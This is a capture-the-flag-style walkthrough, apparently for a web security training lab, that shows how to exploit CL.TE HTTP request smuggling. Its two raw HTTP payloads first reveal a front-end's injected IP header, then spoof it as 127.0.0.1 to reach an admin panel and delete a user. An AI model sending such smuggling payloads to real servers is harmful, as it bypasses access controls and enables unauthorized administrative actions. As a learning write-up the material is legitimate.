Title: Exploiting HTTP request smuggling to reveal front-end request rewriting
Level: PRACTITIONER
Desc:  This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
There's an admin panel at /admin, but it's only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It's similar to the X-Forwarded-For header but has a different name.
To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos. 

# Walkthrough: 
<img width="1302" height="383" alt="image" src="https://github.com/user-attachments/assets/e76a431b-4d6b-4817-bf62-b568e1c330f9" />

Sending following request twice: 
```
POST / HTTP/1.1
Host: 0a880056036fed3181e22ff900ca00fc.web-security-academy.net
Cookie: session=XsYmRyC7hZfErzTv0WmF8ctoydCOZ9tO
Content-Length: 124
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Length: 200
Content-Type: application/x-www-form-urlencoded
Connection: close

search=test
```

Second request response with:
<img width="620" height="274" alt="image" src="https://github.com/user-attachments/assets/13cc5563-cca9-4ef5-bd06-b185ea612c0c" />

We can see exactly part of request after merging 2 request and smuggling request:
<img width="575" height="465" alt="image" src="https://github.com/user-attachments/assets/dab1f931-1ca3-4a7d-8c5a-6c7a7c96a206" />

Custom header is : `X-bPGlvZ-Ip: 37.47.212.63`

Now, sending twice following:
```
POST / HTTP/1.1
Host: 0a880056036fed3181e22ff900ca00fc.web-security-academy.net
Cookie: session=XsYmRyC7hZfErzTv0WmF8ctoydCOZ9tO
Content-Length: 153
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

POST /admin HTTP/1.1
Content-Length: 200
X-bPGlvZ-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Connection: close

search=test
```
<img width="1321" height="703" alt="image" src="https://github.com/user-attachments/assets/530754a1-f4e7-4e9f-9b88-92020717a965" />

<img width="1470" height="313" alt="image" src="https://github.com/user-attachments/assets/70c29812-102c-4cd2-8c29-7933a71e8455" />







